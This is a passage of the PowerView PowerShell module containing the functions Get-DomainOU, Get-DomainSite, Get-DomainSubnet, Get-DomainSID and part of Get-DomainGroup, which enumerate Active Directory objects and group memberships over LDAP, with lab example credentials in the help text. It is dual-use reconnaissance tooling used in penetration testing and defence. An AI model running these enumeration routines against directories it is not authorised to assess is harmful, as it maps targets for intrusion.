        if ($PSBoundParameters['Server']) { $SearcherArguments['Server'] = $Server }
        if ($PSBoundParameters['SearchScope']) { $SearcherArguments['SearchScope'] = $SearchScope }
        if ($PSBoundParameters['ResultPageSize']) { $SearcherArguments['ResultPageSize'] = $ResultPageSize }
        if ($PSBoundParameters['ServerTimeLimit']) { $SearcherArguments['ServerTimeLimit'] = $ServerTimeLimit }
        if ($PSBoundParameters['SecurityMasks']) { $SearcherArguments['SecurityMasks'] = $SecurityMasks }
        if ($PSBoundParameters['Tombstone']) { $SearcherArguments['Tombstone'] = $Tombstone }
        if ($PSBoundParameters['Credential']) { $SearcherArguments['Credential'] = $Credential }
        $OUSearcher = Get-DomainSearcher @SearcherArguments
    }

    PROCESS {
        if ($OUSearcher) {
            $IdentityFilter = ''
            $Filter = ''
            $Identity | Where-Object {$_} | ForEach-Object {
                $IdentityInstance = $_.Replace('(', '\28').Replace(')', '\29')
                if ($IdentityInstance -match '^OU=.*') {
                    $IdentityFilter += "(distinguishedname=$IdentityInstance)"
                    if ((-not $PSBoundParameters['Domain']) -and (-not $PSBoundParameters['SearchBase'])) {
                        # if a -Domain isn't explicitly set, extract the object domain out of the distinguishedname
                        #   and rebuild the domain searcher
                        $IdentityDomain = $IdentityInstance.SubString($IdentityInstance.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'
                        Write-Verbose "[Get-DomainOU] Extracted domain '$IdentityDomain' from '$IdentityInstance'"
                        $SearcherArguments['Domain'] = $IdentityDomain
                        $OUSearcher = Get-DomainSearcher @SearcherArguments
                        if (-not $OUSearcher) {
                            Write-Warning "[Get-DomainOU] Unable to retrieve domain searcher for '$IdentityDomain'"
                        }
                    }
                }
                else {
                    try {
                        $GuidByteString = (-Join (([Guid]$IdentityInstance).ToByteArray() | ForEach-Object {$_.ToString('X').PadLeft(2,'0')})) -Replace '(..)','\$1'
                        $IdentityFilter += "(objectguid=$GuidByteString)"
                    }
                    catch {
                        $IdentityFilter += "(name=$IdentityInstance)"
                    }
                }
            }
            if ($IdentityFilter -and ($IdentityFilter.Trim() -ne '') ) {
                $Filter += "(|$IdentityFilter)"
            }

            if ($PSBoundParameters['GPLink']) {
                Write-Verbose "[Get-DomainOU] Searching for OUs with $GPLink set in the gpLink property"
                $Filter += "(gplink=*$GPLink*)"
            }

            if ($PSBoundParameters['LDAPFilter']) {
                Write-Verbose "[Get-DomainOU] Using additional LDAP filter: $LDAPFilter"
                $Filter += "$LDAPFilter"
            }

            $OUSearcher.filter = "(&(objectCategory=organizationalUnit)$Filter)"
            Write-Verbose "[Get-DomainOU] Get-DomainOU filter string: $($OUSearcher.filter)"

            if ($PSBoundParameters['FindOne']) { $Results = $OUSearcher.FindOne() }
            else { $Results = $OUSearcher.FindAll() }
            $Results | Where-Object {$_} | ForEach-Object {
                if ($PSBoundParameters['Raw']) {
                    # return raw result objects
                    $OU = $_
                }
                else {
                    $OU = Convert-LDAPProperty -Properties $_.Properties
                }
                $OU.PSObject.TypeNames.Insert(0, 'PowerView.OU')
                $OU
            }
            if ($Results) {
                try { $Results.dispose() }
                catch {
                    Write-Verbose "[Get-DomainOU] Error disposing of the Results object: $_"
                }
            }
            $OUSearcher.dispose()
        }
    }
}


function Get-DomainSite {
<#
.SYNOPSIS

Search for all sites or specific site objects in AD.

Author: Will Schroeder (@harmj0y)  
License: BSD 3-Clause  
Required Dependencies: Get-DomainSearcher, Convert-LDAPProperty  

.DESCRIPTION

Builds a directory searcher object using Get-DomainSearcher, builds a custom
LDAP filter based on targeting/filter parameters, and searches for all objects
matching the criteria. To only return specific properties, use
"-Properties whencreated,usnchanged,...". By default, all site objects for
the current domain are returned.

.PARAMETER Identity

An site name (e.g. Test-Site), DistinguishedName (e.g. CN=Test-Site,CN=Sites,CN=Configuration,DC=testlab,DC=local), or
GUID (e.g. c37726ef-2b64-4524-b85b-6a9700c234dd). Wildcards accepted.

.PARAMETER GPLink

Only return sites with the specified GUID in their gplink property.

.PARAMETER Domain

Specifies the domain to use for the query, defaults to the current domain.

.PARAMETER LDAPFilter

Specifies an LDAP query string that is used to filter Active Directory objects.

.PARAMETER Properties

Specifies the properties of the output object to retrieve from the server.

.PARAMETER SearchBase

The LDAP source to search through, e.g. "LDAP://OU=secret,DC=testlab,DC=local"
Useful for OU queries.

.PARAMETER Server

Specifies an Active Directory server (domain controller) to bind to.

.PARAMETER SearchScope

Specifies the scope to search under, Base/OneLevel/Subtree (default of Subtree).

.PARAMETER ResultPageSize

Specifies the PageSize to set for the LDAP searcher object.

.PARAMETER ServerTimeLimit

Specifies the maximum amount of time the server spends searching. Default of 120 seconds.

.PARAMETER SecurityMasks

Specifies an option for examining security information of a directory object.
One of 'Dacl', 'Group', 'None', 'Owner', 'Sacl'.

.PARAMETER Tombstone

Switch. Specifies that the searcher should also return deleted/tombstoned objects.

.PARAMETER FindOne

Only return one result object.

.PARAMETER Credential

A [Management.Automation.PSCredential] object of alternate credentials
for connection to the target domain.

.PARAMETER Raw

Switch. Return raw results instead of translating the fields into a custom PSObject.

.EXAMPLE

Get-DomainSite

Returns the current sites in the domain.

.EXAMPLE

Get-DomainSite *admin* -Domain testlab.local

Returns all sites with "admin" in their name in the testlab.local domain.

.EXAMPLE

Get-DomainSite -GPLink "F260B76D-55C8-46C5-BEF1-9016DD98E272"

Returns all sites with linked to the specified group policy object.

.EXAMPLE

$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\dfm.a', $SecPassword)
Get-DomainSite -Credential $Cred

.OUTPUTS

PowerView.Site

Custom PSObject with translated site property fields.
#>

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.Site')]
    [CmdletBinding()]
    Param (
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('Name')]
        [String[]]
        $Identity,

        [ValidateNotNullOrEmpty()]
        [String]
        [Alias('GUID')]
        $GPLink,

        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,

        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $LDAPFilter,

        [ValidateNotNullOrEmpty()]
        [String[]]
        $Properties,

        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $SearchBase,

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,

        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $SearchScope = 'Subtree',

        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,

        [ValidateSet('Dacl', 'Group', 'None', 'Owner', 'Sacl')]
        [String]
        $SecurityMasks,

        [Switch]
        $Tombstone,

        [Alias('ReturnOne')]
        [Switch]
        $FindOne,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty,

        [Switch]
        $Raw
    )

    BEGIN {
        $SearcherArguments = @{
            'SearchBasePrefix' = 'CN=Sites,CN=Configuration'
        }
        if ($PSBoundParameters['Domain']) { $SearcherArguments['Domain'] = $Domain }
        if ($PSBoundParameters['Properties']) { $SearcherArguments['Properties'] = $Properties }
        if ($PSBoundParameters['SearchBase']) { $SearcherArguments['SearchBase'] = $SearchBase }
        if ($PSBoundParameters['Server']) { $SearcherArguments['Server'] = $Server }
        if ($PSBoundParameters['SearchScope']) { $SearcherArguments['SearchScope'] = $SearchScope }
        if ($PSBoundParameters['ResultPageSize']) { $SearcherArguments['ResultPageSize'] = $ResultPageSize }
        if ($PSBoundParameters['ServerTimeLimit']) { $SearcherArguments['ServerTimeLimit'] = $ServerTimeLimit }
        if ($PSBoundParameters['SecurityMasks']) { $SearcherArguments['SecurityMasks'] = $SecurityMasks }
        if ($PSBoundParameters['Tombstone']) { $SearcherArguments['Tombstone'] = $Tombstone }
        if ($PSBoundParameters['Credential']) { $SearcherArguments['Credential'] = $Credential }
        $SiteSearcher = Get-DomainSearcher @SearcherArguments
    }

    PROCESS {
        if ($SiteSearcher) {
            $IdentityFilter = ''
            $Filter = ''
            $Identity | Where-Object {$_} | ForEach-Object {
                $IdentityInstance = $_.Replace('(', '\28').Replace(')', '\29')
                if ($IdentityInstance -match '^CN=.*') {
                    $IdentityFilter += "(distinguishedname=$IdentityInstance)"
                    if ((-not $PSBoundParameters['Domain']) -and (-not $PSBoundParameters['SearchBase'])) {
                        # if a -Domain isn't explicitly set, extract the object domain out of the distinguishedname
                        #   and rebuild the domain searcher
                        $IdentityDomain = $IdentityInstance.SubString($IdentityInstance.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'
                        Write-Verbose "[Get-DomainSite] Extracted domain '$IdentityDomain' from '$IdentityInstance'"
                        $SearcherArguments['Domain'] = $IdentityDomain
                        $SiteSearcher = Get-DomainSearcher @SearcherArguments
                        if (-not $SiteSearcher) {
                            Write-Warning "[Get-DomainSite] Unable to retrieve domain searcher for '$IdentityDomain'"
                        }
                    }
                }
                else {
                    try {
                        $GuidByteString = (-Join (([Guid]$IdentityInstance).ToByteArray() | ForEach-Object {$_.ToString('X').PadLeft(2,'0')})) -Replace '(..)','\$1'
                        $IdentityFilter += "(objectguid=$GuidByteString)"
                    }
                    catch {
                        $IdentityFilter += "(name=$IdentityInstance)"
                    }
                }
            }
            if ($IdentityFilter -and ($IdentityFilter.Trim() -ne '') ) {
                $Filter += "(|$IdentityFilter)"
            }

            if ($PSBoundParameters['GPLink']) {
                Write-Verbose "[Get-DomainSite] Searching for sites with $GPLink set in the gpLink property"
                $Filter += "(gplink=*$GPLink*)"
            }

            if ($PSBoundParameters['LDAPFilter']) {
                Write-Verbose "[Get-DomainSite] Using additional LDAP filter: $LDAPFilter"
                $Filter += "$LDAPFilter"
            }

            $SiteSearcher.filter = "(&(objectCategory=site)$Filter)"
            Write-Verbose "[Get-DomainSite] Get-DomainSite filter string: $($SiteSearcher.filter)"

            if ($PSBoundParameters['FindOne']) { $Results = $SiteSearcher.FindAll() }
            else { $Results = $SiteSearcher.FindAll() }
            $Results | Where-Object {$_} | ForEach-Object {
                if ($PSBoundParameters['Raw']) {
                    # return raw result objects
                    $Site = $_
                }
                else {
                    $Site = Convert-LDAPProperty -Properties $_.Properties
                }
                $Site.PSObject.TypeNames.Insert(0, 'PowerView.Site')
                $Site
            }
            if ($Results) {
                try { $Results.dispose() }
                catch {
                    Write-Verbose "[Get-DomainSite] Error disposing of the Results object"
                }
            }
            $SiteSearcher.dispose()
        }
    }
}


function Get-DomainSubnet {
<#
.SYNOPSIS

Search for all subnets or specific subnets objects in AD.

Author: Will Schroeder (@harmj0y)  
License: BSD 3-Clause  
Required Dependencies: Get-DomainSearcher, Convert-LDAPProperty  

.DESCRIPTION

Builds a directory searcher object using Get-DomainSearcher, builds a custom
LDAP filter based on targeting/filter parameters, and searches for all objects
matching the criteria. To only return specific properties, use
"-Properties whencreated,usnchanged,...". By default, all subnet objects for
the current domain are returned.

.PARAMETER Identity

An subnet name (e.g. '192.168.50.0/24'), DistinguishedName (e.g. 'CN=192.168.50.0/24,CN=Subnets,CN=Sites,CN=Configuratioiguration,DC=testlab,DC=local'),
or GUID (e.g. c37726ef-2b64-4524-b85b-6a9700c234dd). Wildcards accepted.

.PARAMETER SiteName

Only return subnets from the specified SiteName.

.PARAMETER Domain

Specifies the domain to use for the query, defaults to the current domain.

.PARAMETER LDAPFilter

Specifies an LDAP query string that is used to filter Active Directory objects.

.PARAMETER Properties

Specifies the properties of the output object to retrieve from the server.

.PARAMETER SearchBase

The LDAP source to search through, e.g. "LDAP://OU=secret,DC=testlab,DC=local"
Useful for OU queries.

.PARAMETER Server

Specifies an Active Directory server (domain controller) to bind to.

.PARAMETER SearchScope

Specifies the scope to search under, Base/OneLevel/Subtree (default of Subtree).

.PARAMETER ResultPageSize

Specifies the PageSize to set for the LDAP searcher object.

.PARAMETER ServerTimeLimit

Specifies the maximum amount of time the server spends searching. Default of 120 seconds.

.PARAMETER SecurityMasks

Specifies an option for examining security information of a directory object.
One of 'Dacl', 'Group', 'None', 'Owner', 'Sacl'.

.PARAMETER Tombstone

Switch. Specifies that the searcher should also return deleted/tombstoned objects.

.PARAMETER FindOne

Only return one result object.

.PARAMETER Credential

A [Management.Automation.PSCredential] object of alternate credentials
for connection to the target domain.

.PARAMETER Raw

Switch. Return raw results instead of translating the fields into a custom PSObject.

.EXAMPLE

Get-DomainSubnet

Returns the current subnets in the domain.

.EXAMPLE

Get-DomainSubnet *admin* -Domain testlab.local

Returns all subnets with "admin" in their name in the testlab.local domain.

.EXAMPLE

Get-DomainSubnet -GPLink "F260B76D-55C8-46C5-BEF1-9016DD98E272"

Returns all subnets with linked to the specified group policy object.

.EXAMPLE

$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\dfm.a', $SecPassword)
Get-DomainSubnet -Credential $Cred

.OUTPUTS

PowerView.Subnet

Custom PSObject with translated subnet property fields.
#>

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.Subnet')]
    [CmdletBinding()]
    Param (
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('Name')]
        [String[]]
        $Identity,

        [ValidateNotNullOrEmpty()]
        [String]
        $SiteName,

        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,

        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $LDAPFilter,

        [ValidateNotNullOrEmpty()]
        [String[]]
        $Properties,

        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $SearchBase,

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,

        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $SearchScope = 'Subtree',

        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,

        [ValidateSet('Dacl', 'Group', 'None', 'Owner', 'Sacl')]
        [String]
        $SecurityMasks,

        [Switch]
        $Tombstone,

        [Alias('ReturnOne')]
        [Switch]
        $FindOne,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty,

        [Switch]
        $Raw
    )

    BEGIN {
        $SearcherArguments = @{
            'SearchBasePrefix' = 'CN=Subnets,CN=Sites,CN=Configuration'
        }
        if ($PSBoundParameters['Domain']) { $SearcherArguments['Domain'] = $Domain }
        if ($PSBoundParameters['Properties']) { $SearcherArguments['Properties'] = $Properties }
        if ($PSBoundParameters['SearchBase']) { $SearcherArguments['SearchBase'] = $SearchBase }
        if ($PSBoundParameters['Server']) { $SearcherArguments['Server'] = $Server }
        if ($PSBoundParameters['SearchScope']) { $SearcherArguments['SearchScope'] = $SearchScope }
        if ($PSBoundParameters['ResultPageSize']) { $SearcherArguments['ResultPageSize'] = $ResultPageSize }
        if ($PSBoundParameters['ServerTimeLimit']) { $SearcherArguments['ServerTimeLimit'] = $ServerTimeLimit }
        if ($PSBoundParameters['SecurityMasks']) { $SearcherArguments['SecurityMasks'] = $SecurityMasks }
        if ($PSBoundParameters['Tombstone']) { $SearcherArguments['Tombstone'] = $Tombstone }
        if ($PSBoundParameters['Credential']) { $SearcherArguments['Credential'] = $Credential }
        $SubnetSearcher = Get-DomainSearcher @SearcherArguments
    }

    PROCESS {
        if ($SubnetSearcher) {
            $IdentityFilter = ''
            $Filter = ''
            $Identity | Where-Object {$_} | ForEach-Object {
                $IdentityInstance = $_.Replace('(', '\28').Replace(')', '\29')
                if ($IdentityInstance -match '^CN=.*') {
                    $IdentityFilter += "(distinguishedname=$IdentityInstance)"
                    if ((-not $PSBoundParameters['Domain']) -and (-not $PSBoundParameters['SearchBase'])) {
                        # if a -Domain isn't explicitly set, extract the object domain out of the distinguishedname
                        #   and rebuild the domain searcher
                        $IdentityDomain = $IdentityInstance.SubString($IdentityInstance.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'
                        Write-Verbose "[Get-DomainSubnet] Extracted domain '$IdentityDomain' from '$IdentityInstance'"
                        $SearcherArguments['Domain'] = $IdentityDomain
                        $SubnetSearcher = Get-DomainSearcher @SearcherArguments
                        if (-not $SubnetSearcher) {
                            Write-Warning "[Get-DomainSubnet] Unable to retrieve domain searcher for '$IdentityDomain'"
                        }
                    }
                }
                else {
                    try {
                        $GuidByteString = (-Join (([Guid]$IdentityInstance).ToByteArray() | ForEach-Object {$_.ToString('X').PadLeft(2,'0')})) -Replace '(..)','\$1'
                        $IdentityFilter += "(objectguid=$GuidByteString)"
                    }
                    catch {
                        $IdentityFilter += "(name=$IdentityInstance)"
                    }
                }
            }
            if ($IdentityFilter -and ($IdentityFilter.Trim() -ne '') ) {
                $Filter += "(|$IdentityFilter)"
            }

            if ($PSBoundParameters['LDAPFilter']) {
                Write-Verbose "[Get-DomainSubnet] Using additional LDAP filter: $LDAPFilter"
                $Filter += "$LDAPFilter"
            }

            $SubnetSearcher.filter = "(&(objectCategory=subnet)$Filter)"
            Write-Verbose "[Get-DomainSubnet] Get-DomainSubnet filter string: $($SubnetSearcher.filter)"

            if ($PSBoundParameters['FindOne']) { $Results = $SubnetSearcher.FindOne() }
            else { $Results = $SubnetSearcher.FindAll() }
            $Results | Where-Object {$_} | ForEach-Object {
                if ($PSBoundParameters['Raw']) {
                    # return raw result objects
                    $Subnet = $_
                }
                else {
                    $Subnet = Convert-LDAPProperty -Properties $_.Properties
                }
                $Subnet.PSObject.TypeNames.Insert(0, 'PowerView.Subnet')

                if ($PSBoundParameters['SiteName']) {
                    # have to do the filtering after the LDAP query as LDAP doesn't let you specify
                    #   wildcards for 'siteobject' :(
                    if ($Subnet.properties -and ($Subnet.properties.siteobject -like "*$SiteName*")) {
                        $Subnet
                    }
                    elseif ($Subnet.siteobject -like "*$SiteName*") {
                        $Subnet
                    }
                }
                else {
                    $Subnet
                }
            }
            if ($Results) {
                try { $Results.dispose() }
                catch {
                    Write-Verbose "[Get-DomainSubnet] Error disposing of the Results object: $_"
                }
            }
            $SubnetSearcher.dispose()
        }
    }
}


function Get-DomainSID {
<#
.SYNOPSIS

Returns the SID for the current domain or the specified domain.

Author: Will Schroeder (@harmj0y)  
License: BSD 3-Clause  
Required Dependencies: Get-DomainComputer  

.DESCRIPTION

Returns the SID for the current domain or the specified domain by executing
Get-DomainComputer with the -LDAPFilter set to (userAccountControl:1.2.840.113556.1.4.803:=8192)
to search for domain controllers through LDAP. The SID of the returned domain controller
is then extracted.

.PARAMETER Domain

Specifies the domain to use for the query, defaults to the current domain.

.PARAMETER Server

Specifies an Active Directory server (domain controller) to bind to.

.PARAMETER Credential

A [Management.Automation.PSCredential] object of alternate credentials
for connection to the target domain.

.EXAMPLE

Get-DomainSID

.EXAMPLE

Get-DomainSID -Domain testlab.local

.EXAMPLE

$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\dfm.a', $SecPassword)
Get-DomainSID -Credential $Cred

.OUTPUTS

String

A string representing the specified domain SID.
#>

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType([String])]
    [CmdletBinding()]
    Param(
        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )

    $SearcherArguments = @{
        'LDAPFilter' = '(userAccountControl:1.2.840.113556.1.4.803:=8192)'
    }
    if ($PSBoundParameters['Domain']) { $SearcherArguments['Domain'] = $Domain }
    if ($PSBoundParameters['Server']) { $SearcherArguments['Server'] = $Server }
    if ($PSBoundParameters['Credential']) { $SearcherArguments['Credential'] = $Credential }

    $DCSID = Get-DomainComputer @SearcherArguments -FindOne | Select-Object -First 1 -ExpandProperty objectsid

    if ($DCSID) {
        $DCSID.SubString(0, $DCSID.LastIndexOf('-'))
    }
    else {
        Write-Verbose "[Get-DomainSID] Error extracting domain SID for '$Domain'"
    }
}


function Get-DomainGroup {
<#
.SYNOPSIS

Return all groups or specific group objects in AD.

Author: Will Schroeder (@harmj0y)  
License: BSD 3-Clause  
Required Dependencies: Get-DomainSearcher, Get-DomainObject, Convert-ADName, Convert-LDAPProperty  

.DESCRIPTION

Builds a directory searcher object using Get-DomainSearcher, builds a custom
LDAP filter based on targeting/filter parameters, and searches for all objects
matching the criteria. To only return specific properties, use
"-Properties samaccountname,usnchanged,...". By default, all group objects for
the current domain are returned. To return the groups a specific user/group is
a part of, use -MemberIdentity X to execute token groups enumeration.

.PARAMETER Identity

A SamAccountName (e.g. Group1), DistinguishedName (e.g. CN=group1,CN=Users,DC=testlab,DC=local),
SID (e.g. S-1-5-21-890171859-3433809279-3366196753-1114), or GUID (e.g. 4c435dd7-dc58-4b14-9a5e-1fdb0e80d202)
specifying the group to query for. Wildcards accepted.

.PARAMETER MemberIdentity

A SamAccountName (e.g. Group1), DistinguishedName (e.g. CN=group1,CN=Users,DC=testlab,DC=local),
SID (e.g. S-1-5-21-890171859-3433809279-3366196753-1114), or GUID (e.g. 4c435dd7-dc58-4b14-9a5e-1fdb0e80d202)
specifying the user/group member to query for group membership.

.PARAMETER AdminCount

Switch. Return users with '(adminCount=1)' (meaning are/were privileged).

.PARAMETER GroupScope

Specifies the scope (DomainLocal, Global, or Universal) of the group(s) to search for.
Also accepts NotDomainLocal, NotGloba, and NotUniversal as negations.

.PARAMETER GroupProperty

Specifies a specific property to search for when performing the group search.
Possible values are Security, Distribution, CreatedBySystem, and NotCreatedBySystem.

.PARAMETER Domain

Specifies the domain to use for the query, defaults to the current domain.

.PARAMETER LDAPFilter

Specifies an LDAP query string that is used to filter Active Directory objects.

.PARAMETER Properties

Specifies the properties of the output object to retrieve from the server.

.PARAMETER SearchBase

The LDAP source to search through, e.g. "LDAP://OU=secret,DC=testlab,DC=local"
Useful for OU queries.

.PARAMETER Server

Specifies an Active Directory server (domain controller) to bind to.

.PARAMETER SearchScope

Specifies the scope to search under, Base/OneLevel/Subtree (default of Subtree).

.PARAMETER ResultPageSize

Specifies the PageSize to set for the LDAP searcher object.

.PARAMETER ServerTimeLimit

Specifies the maximum amount of time the server spends searching. Default of 120 seconds.

.PARAMETER SecurityMasks

Specifies an option for examining security information of a directory object.
One of 'Dacl', 'Group', 'None', 'Owner', 'Sacl'.

.PARAMETER Tombstone

Switch. Specifies that the searcher should also return deleted/tombstoned objects.

.PARAMETER FindOne

Only return one result object.

.PARAMETER Credential

A [Management.Automation.PSCredential] object of alternate credentials
for connection to the target domain.

.PARAMETER Raw

Switch. Return raw results instead of translating the fields into a custom PSObject.

.EXAMPLE

Get-DomainGroup | select samaccountname

samaccountname
--------------
WinRMRemoteWMIUsers__
Administrators
Users
Guests
Print Operators
Backup Operators
...

.EXAMPLE

Get-DomainGroup *admin* | select distinguishedname

distinguishedname
-----------------
CN=Administrators,CN=Builtin,DC=testlab,DC=local
CN=Hyper-V Administrators,CN=Builtin,DC=testlab,DC=local
CN=Schema Admins,CN=Users,DC=testlab,DC=local
CN=Enterprise Admins,CN=Users,DC=testlab,DC=local
CN=Domain Admins,CN=Users,DC=testlab,DC=local
CN=DnsAdmins,CN=Users,DC=testlab,DC=local
CN=Server Admins,CN=Users,DC=testlab,DC=local
CN=Desktop Admins,CN=Users,DC=testlab,DC=local

.EXAMPLE

Get-DomainGroup -Properties samaccountname -Identity 'S-1-5-21-890171859-3433809279-3366196753-1117' | fl

samaccountname
--------------
Server Admins

.EXAMPLE

'CN=Desktop Admins,CN=Users,DC=testlab,DC=local' | Get-DomainGroup -Server primary.testlab.local -Verbose
VERBOSE: Get-DomainSearcher search string: LDAP://DC=testlab,DC=local
VERBOSE: Get-DomainGroup filter string: (&(objectCategory=group)(|(distinguishedname=CN=DesktopAdmins,CN=Users,DC=testlab,DC=local)))

usncreated            : 13245
grouptype             : -2147483646
samaccounttype        : 268435456
samaccountname        : Desktop Admins
whenchanged           : 8/10/2016 12:30:30 AM
objectsid             : S-1-5-21-890171859-3433809279-3366196753-1118
objectclass           : {top, group}
cn                    : Desktop Admins
usnchanged            : 13255
dscorepropagationdata : 1/1/1601 12:00:00 AM
name                  : Desktop Admins
distinguishedname     : CN=Desktop Admins,CN=Users,DC=testlab,DC=local
member                : CN=Andy Robbins (admin),CN=Users,DC=testlab,DC=local
whencreated           : 8/10/2016 12:29:43 AM
instancetype          : 4
objectguid            : f37903ed-b333-49f4-abaa-46c65e9cca71
objectcategory        : CN=Group,CN=Schema,CN=Configuration,DC=testlab,DC=local

.EXAMPLE

$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\dfm.a', $SecPassword)
Get-DomainGroup -Credential $Cred

.EXAMPLE

Get-Domain | Select-Object -Expand name
testlab.local

'DEV\Domain Admins' | Get-DomainGroup -Verbose -Properties distinguishedname
VERBOSE: [Get-DomainSearcher] search string: LDAP://PRIMARY.testlab.local/DC=testlab,DC=local
VERBOSE: [Get-DomainGroup] Extracted domain 'dev.testlab.local' from 'DEV\Domain Admins'
VERBOSE: [Get-DomainSearcher] search string: LDAP://PRIMARY.testlab.local/DC=dev,DC=testlab,DC=local
VERBOSE: [Get-DomainGroup] filter string: (&(objectCategory=group)(|(samAccountName=Domain Admins)))

distinguishedname
-----------------
CN=Domain Admins,CN=Users,DC=dev,DC=testlab,DC=local

.OUTPUTS

PowerView.Group

Custom PSObject with translated group property fields.
#>

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseDeclaredVarsMoreThanAssignments', '')]
    [OutputType('PowerView.Group')]
    [CmdletBinding(DefaultParameterSetName = 'AllowDelegation')]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('DistinguishedName', 'SamAccountName', 'Name', 'MemberDistinguishedName', 'MemberName')]
        [String[]]
        $Identity,

        [ValidateNotNullOrEmpty()]
        [Alias('UserName')]
        [String]
        $MemberIdentity,

        [Switch]
        $AdminCount,

        [ValidateSet('DomainLocal', 'NotDomainLocal', 'Global', 'NotGlobal', 'Universal', 'NotUniversal')]
        [Alias('Scope')]
        [String]
        $GroupScope,

        [ValidateSet('Security', 'Distribution', 'CreatedBySystem', 'NotCreatedBySystem')]
        [String]
        $GroupProperty,

        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,

        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $LDAPFilter,

        [ValidateNotNullOrEmpty()]
        [String[]]
        $Properties,

        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $SearchBase,

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,

        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $SearchScope = 'Subtree',

        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,

        [ValidateSet('Dacl', 'Group', 'None', 'Owner', 'Sacl')]
        [String]
        $SecurityMasks,

        [Switch]
        $Tombstone,

        [Alias('ReturnOne')]
        [Switch]
        $FindOne,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty,

        [Switch]
        $Raw
    )

    BEGIN {
        $SearcherArguments = @{}
        if ($PSBoundParameters['Domain']) { $SearcherArguments['Domain'] = $Domain }
        if ($PSBoundParameters['Properties']) { $SearcherArguments['Properties'] = $Properties }
        if ($PSBoundParameters['SearchBase']) { $SearcherArguments['SearchBase'] = $SearchBase }
        if ($PSBoundParameters['Server']) { $SearcherArguments['Server'] = $Server }
        if ($PSBoundParameters['SearchScope']) { $SearcherArguments['SearchScope'] = $SearchScope }
        if ($PSBoundParameters['ResultPageSize']) { $SearcherArguments['ResultPageSize'] = $ResultPageSize }
        if ($PSBoundParameters['ServerTimeLimit']) { $SearcherArguments['ServerTimeLimit'] = $ServerTimeLimit }
        if ($PSBoundParameters['SecurityMasks']) { $SearcherArguments['SecurityMasks'] = $SecurityMasks }
        if ($PSBoundParameters['Tombstone']) { $SearcherArguments['Tombstone'] = $Tombstone }
        if ($PSBoundParameters['Credential']) { $SearcherArguments['Credential'] = $Credential }
        $GroupSearcher = Get-DomainSearcher @SearcherArguments
    }

    PROCESS {
        if ($GroupSearcher) {
            if ($PSBoundParameters['MemberIdentity']) {

                if ($SearcherArguments['Properties']) {
                    $OldProperties = $SearcherArguments['Properties']
                }

                $SearcherArguments['Identity'] = $MemberIdentity
                $SearcherArguments['Raw'] = $True

                Get-DomainObject @SearcherArguments | ForEach-Object {
                    # convert the user/group to a directory entry
                    $ObjectDirectoryEntry = $_.GetDirectoryEntry()

                    # cause the cache to calculate the token groups for the user/group
                    $ObjectDirectoryEntry.RefreshCache('tokenGroups')

                    $ObjectDirectoryEntry.TokenGroups | ForEach-Object {
                        # convert the token group sid
                        $GroupSid = (New-Object System.Security.Principal.SecurityIdentifier($_,0)).Value

                        # ignore the built in groups
                        if ($GroupSid -notmatch '^S-1-5-32-.*') {
                            $SearcherArguments['Identity'] = $GroupSid
                            $SearcherArguments['Raw'] = $False
                            if ($OldProperties) { $SearcherArguments['Properties'] = $OldProperties }
                            $Group = Get-DomainObject @SearcherArguments
                            if ($Group) {
